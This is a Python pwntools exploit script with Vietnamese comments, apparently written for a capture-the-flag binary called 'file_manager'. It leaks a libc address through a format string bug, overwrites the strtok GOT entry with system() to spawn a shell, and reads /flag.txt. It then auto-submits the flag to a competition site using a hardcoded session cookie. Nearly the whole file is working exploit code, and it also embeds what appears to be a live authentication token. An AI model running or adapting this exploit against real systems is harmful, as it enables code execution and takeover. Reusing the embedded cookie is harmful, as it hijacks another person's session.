#!/usr/bin/env python3
from pwn import *
import re
import requests # Thêm thư viện requests
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Bỏ qua cảnh báo SSL (thường gặp trong CTF)
warnings.simplefilter('ignore', InsecureRequestWarning)


# --- Cấu hình thư viện ---
exe = ELF('file_manager', checksec=False)
libc = exe.libc # Giả sử file libc nằm cùng thư mục hoặc đã được patchelf

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

# --- Các hàm tiện ích (giữ nguyên) ---
info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*cmd_cat +397
        c
    """)

# --- Cấu hình kết nối ---
if args.REMOTE:
    p = remote("35.240.149.115", int("1337"))
else:
    # Đảm bảo bạn có libc đúng. Bạn có thể cần chạy `pwn patch --libc /path/to/libc ./file_manager`
    p = process([exe.path])
    if args.GDB:
        GDB()

# --- Các hàm tương tác (giữ nguyên) ---
def register(user, password):
    sla(b'> ', b'register')
    sla(b'Username: ', user)
    sla(b'Password: ', password)

def login(user, password):
    sla(b'> ', b'login')
    sla(b'Username: ', user)
    sla(b'Password: ', password)

def write_file(filename, content_bytes):
    sla(b'> ', f'write {filename}'.encode())
    hex_content = content_bytes.hex()
    sla(b'Enter content as hex string', hex_content.encode())

def cat_file(filename):
    sla(b'> ', f'cat {filename}'.encode())
    # Đọc cho đến khi gặp lại prompt "> ", trả về phần output ở giữa
    return ru(b'> ')

# --- Bắt đầu khai thác ---
username = b"hacker"
password = b"123"
register(username, password)
login(username, password)

# --- 1. Leak địa chỉ Libc ---
info("Bắt đầu leak địa chỉ Libc...")
leak_payload = b'%15$p' # Bạn đã tìm ra offset 15, rất tốt!

write_file("leak.txt", leak_payload)
output = cat_file("leak.txt")

match = re.search(rb'0x[0-9a-fA-F]+', output)
if not match:
    log.error("Không thể leak địa chỉ!")
    exit()

libc_leak = int(match.group(0), 16)
info(f"LIBC LEAK: {hex(libc_leak)}")

# Offset này bạn đã tính toán (ví dụ: __libc_start_main+XXX hoặc tương tự)
LIBC_LEAK_OFFSET = 0x601b3 
libc.address = libc_leak - LIBC_LEAK_OFFSET
log.success(f"Libc Base: {hex(libc.address)}")

system_addr = libc.symbols['system']
log.success(f"System Address: {hex(system_addr)}")

# --- 2. Ghi đè GOT ---
info("Chuẩn bị ghi đè GOT...")
got_strtok = exe.got['strtok']
log.info(f"GOT strtok: {hex(got_strtok)}")

format_string_offset = 6 # Bạn đã tìm ra offset này, rất tốt!

writes = {got_strtok: system_addr}
payload = fmtstr_payload(format_string_offset, writes, write_size='short')

write_file("pwn.txt", payload)

info("Kích hoạt payload ghi đè GOT...")
sla(b'> ', b'cat pwn.txt')
ru(b'> ') # Chờ prompt quay lại

# --- 3. Lấy Shell và Tự động Lấy Flag ---
info("Lấy shell và đọc flag...")
sl(b'/bin/sh') # Gửi lệnh này, strtok -> system("/bin/sh")

# Shell đã được mở, giờ gửi lệnh cat
sl(b'cat /flag.txt')

# Đọc output. Giả sử flag nằm trong dấu {}
try:
    flag_output = ru(b'}')
    # Lọc lại để lấy đúng flag
    flag_match = re.search(rb'CSCV2025\{[a-f0-9]+\}', flag_output)
    if flag_match:
        flag = flag_match.group(0).decode()
        log.success(f"FLAG ĐÃ LẤY ĐƯỢC: {flag}")

        # --- 4. Tự động Submit Flag ---
        
        info("Bắt đầu tự động submit flag...")
        try:
            # URL bạn cung cấp (đã bỏ dấu #)
            submit_url = "https://ad.cscv.vn/final" 
            
            # ***** HƯỚNG DẪN LẤY COOKIE *****
            # 1. Mở trình duyệt, đăng nhập vào https://ad.cscv.vn
            # 2. Mở Developer Tools (F12)
            # 3. Đi đến tab "Application" (Chrome) hoặc "Storage" (Firefox)
            # 4. Tìm phần "Cookies" -> "https://ad.cscv.vn"
            # 5. Tìm cookie dùng để xác thực (ví dụ: "session", "token", "PHPSESSID")
            # 6. Copy TÊN cookie và GIÁ TRỊ của nó vào dict bên dưới:
            my_cookies = {
                "session": "4fcb192b-ccb7-4136-b042-68cbb372cc88.0v2Nh7o8Pgywnqwcugki0NKgPA8" # SỬA "session" thành TÊN cookie của bạn
            }
            
            # Tên field <input name="flag"> bạn cung cấp
            payload_data = {
                "flag": flag
            }

            # Thêm verify=False để bỏ qua lỗi SSL
            r = requests.post(submit_url, data=payload_data, cookies=my_cookies, verify=False) 
            
            # Kiểm tra xem server trả về gì. Bạn có thể cần chỉnh "Correct"
            if "Correct" in r.text or "đúng" in r.text or "chấp nhận" in r.text or "accepted" in r.text:
                log.success("Submit flag THÀNH CÔNG!")
            else:
                log.warning(f"Submit flag có thể THẤT BẠI. Server response (200 chars): {r.text[:200]}")
        
        except Exception as e:
            log.error(f"Lỗi khi submit flag: {e}")

    else:
        log.warning("Đã có shell, nhưng không tìm thấy flag. Output:")
        print(flag_output)

except:
    log.error("Không thể đọc flag. Chuyển sang chế độ interactive.")

# Chuyển sang chế độ tương tác để bạn có thể gõ lệnh thủ công
p.interactive()